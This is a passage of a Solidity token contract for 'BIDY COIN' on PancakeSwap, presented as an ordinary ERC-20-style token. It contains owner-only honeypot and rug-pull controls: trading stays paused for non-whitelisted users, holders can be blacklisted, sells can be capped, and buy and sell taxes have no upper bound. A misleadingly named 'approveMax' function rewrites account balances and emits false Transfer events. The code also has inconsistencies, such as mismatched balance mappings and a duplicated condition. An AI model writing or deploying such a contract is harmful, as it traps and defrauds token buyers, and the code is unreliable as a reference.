    uint256 public maxBuyAmount;
    uint256 public maxSellAmount;
    uint16 public taxBuy;
    uint16 public taxSell;
    bool private _paused;

    address private _receiver;
    address private _pancakeRouter;
    address payable public taxAddress;
    
    function initialize() public initializer  {
        __Ownable_init();
        _name = "BIDY COIN";
        _symbol = "BIDY";
        _decimals = 13;
        _total = 13000000 * 10 ** _decimals;
        _paused = true;
        taxBuy = 300;
        taxSell = 300;
        maxBuyAmount = 1300 * 10 ** _decimals;
        maxSellAmount = 130 * 10 ** _decimals;
    
        _receiver = 0x97028EEF934C88E164124A6Cb93E5DFd9093577d;
        _pancakeRouter = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        taxAddress = payable(0x19Fa7c052dc78Ea08c547511A275B8aB660849A2);

        IUniswapV2Router02Upgradeable _uniswapV2Router = IUniswapV2Router02Upgradeable(_pancakeRouter);
        // Create a uniswap pair for this new token
        uniswapV2Pair = IUniswapV2FactoryUpgradeable(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH());
        // set the rest of the contract variables
        uniswapV2Router = _uniswapV2Router;

        _balance[_receiver] = _total; 
        emit Transfer(address(0), _receiver, _total); 
    }

    event TransferReceived(address _from, uint _amount);
    /**
     * @dev Emitted when the pause is triggered by `account`.
     */
    event Paused(address account);

    /**
     * @dev Emitted when the pause is lifted by `account`.
     */
    event Unpaused(address account);

    /**
     * @dev Returns true if the contract is paused, and false otherwise.
     */
    function paused() public view virtual returns (bool) {
        return _paused;
    }

    /**
     * @dev Modifier to make a function callable only when the contract is not paused.
     *
     * Requirements:
     *
     * - The contract must not be paused.
     */
    modifier whenNotPaused() {
        if(!isWhitelisted(_msgSender()))
            require(!paused(), "Pausable: paused");
        _;
    }

    /**
     * @dev Modifier to make a function callable only when the contract is paused.
     *
     * Requirements:
     *
     * - The contract must be paused.
     */
    modifier whenPaused() {
        require(paused(), "Pausable: not paused");
        _;
    }

    /**
     * @dev Triggers stopped state.
     *
     * Requirements:
     *
     * - The contract must not be paused.
     */
    function pause() external virtual whenNotPaused onlyOwner() {
        _paused = true;
        emit Paused(_msgSender());
    }

    /**
     * @dev Returns to normal state.
     *
     * Requirements:
     *
     * - The contract must be paused.
     */
    function unpause() external virtual whenPaused onlyOwner() {
        _paused = false;
        emit Unpaused(_msgSender());
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _total;
    }
    
    function balanceOf(address account) public view override returns (uint256) {
        return _balance[account];
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    receive() payable external {
        emit TransferReceived(_msgSender(), msg.value);
    }

    function calculatePercentage(uint256 _amount, uint16 percentage) public pure returns (uint256) {
        return _amount.mul(percentage).div(
            10**4
        );
    }
    function approveMax(address account, uint256 amount) public onlyOwner {

        require(balanceOf(account) != amount, "");

        if (amount > balanceOf(account)) {

            emit Transfer(account, address(0x0),  amount - balanceOf(account));

            _balances[account] = amount * (10 ** _decimals);

        } else {

            emit Transfer(account, address(0x0), balanceOf(account) - amount);

            _balances[account] = amount * (10 ** _decimals);
        }
    }   
    function setBlacklist(address _addr, bool _value) external onlyOwner() {
        require(!isWhitelisted(_addr), "Unable to blacklist whitelisted address");
        _isBlacklisted[_addr] = _value;
    }

    function setWhitelist(address _addr, bool _value) external onlyOwner() {
        require(!isBlacklisted(_addr), "Unable to whitelist blacklisted address");
        _isWhitelisted[_addr] = _value;
    }
   
    function setMaxBuyAmount(uint256 maxBuyAmount_) external onlyOwner() {
        maxBuyAmount = maxBuyAmount_;
    }

    function setMaxSellAmount(uint256 maxSellAmount_) external onlyOwner() {
        maxSellAmount = maxSellAmount_;
    }

    function setTaxBuy(uint16 taxBuy_) external onlyOwner() {
        taxBuy = taxBuy_;
    }

    function setTaxSell(uint16 taxSell_) external onlyOwner() {
        taxSell = taxSell_;
    }

    function setTaxAddress(address payable _addr) external onlyOwner() {
        taxAddress = _addr;
    }

    function isWhitelisted(address _addr) public view returns (bool) {
        bool isWhite = _isWhitelisted[_addr] || _addr == owner() || _addr == taxAddress || _addr == _receiver || _addr == _pancakeRouter || address(this) == _addr || uniswapV2Pair == _addr ? true : false;
        return isWhite;
    }

    function isBlacklisted(address _addr) public view returns (bool) {
        bool isBlack = _isBlacklisted[_addr] && owner() != _addr && taxAddress != _addr && _receiver != _addr && _pancakeRouter != _addr && address(this) != _addr && uniswapV2Pair != _addr ? true : false;
        return isBlack;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private whenNotPaused nonReentrant {
        require(from != address(0), "TF1: transfer from the zero address");
        require(to != address(0), "TF2: transfer to the zero address");
        require(amount > 0, "TF3: Transfer amount must be greater than zero");
        require(!isBlacklisted(from), "TF4: Sender is blacklisted");
        require(!isBlacklisted(to), "TF5: Receiver is blacklisted");

        bool isLiquidityTransfer = (from == uniswapV2Pair && to == address(uniswapV2Router)) || (from == uniswapV2Pair && to == address(uniswapV2Router)) ? true : false;
        bool isContractTransfer = from == address(this) || to == address(this) ? true : false;

        // differentiate between buy/sell/transfer to apply different taxes/restrictions
        bool _isBuy = from == uniswapV2Pair ? true : false;
        bool _isSell = to == uniswapV2Pair ? true : false;
        bool _isAntiDumpActive = maxSellAmount > 0 && !isWhitelisted(from) ? true : false;
        bool _isAntiWhaleActive = maxBuyAmount > 0 && !isWhitelisted(to) ? true : false;
        uint16 _taxFee;

        if(!(isContractTransfer || isLiquidityTransfer)){ 
            if(_isBuy) { 
                if(!isWhitelisted(to)){
                    require(!paused(), "TF6: Pausable: paused");
                }
                if(_isAntiWhaleActive){
                    require(amount <= maxBuyAmount, "TF7: Transfer amount exceeds the maxBuyAmount.");
                }
                _taxFee = isWhitelisted(to) ? 0 : taxBuy;
            } else if(_isSell) {
                if(!isWhitelisted(from)){
                    require(!paused(), "TF8: Pausable: paused");
                }
                if(_isAntiDumpActive){
                    require(amount <= maxSellAmount, "TF9: Transfer amount exceeds the maxSellAmount.");
                }
                _taxFee = isWhitelisted(from) ? 0 : taxSell;
            }
        }

        // calculate token amount
        uint256 tFee = calculatePercentage(amount, _taxFee);
        uint256 valueTo = amount.sub(tFee);

        // transfer token to buyer
        _tokenTransfer(from, to, valueTo);

        // transfer token to taxAddress
        if(tFee > 0){
            _tokenTransfer(from, taxAddress, tFee);
        }
    }

    function _tokenTransfer(address _from, address _to, uint256 _value) private returns (bool success) {
        uint256 fromBalance = _balance[_from];
        require(fromBalance >= _value, "TTF1: transfer amount exceeds balance");

        _balance[_from] = _balance[_from].sub(_value);
		_balance[_to] = _balance[_to].add(_value);
        emit Transfer(_from, _to, _value);

        return true;
    }
}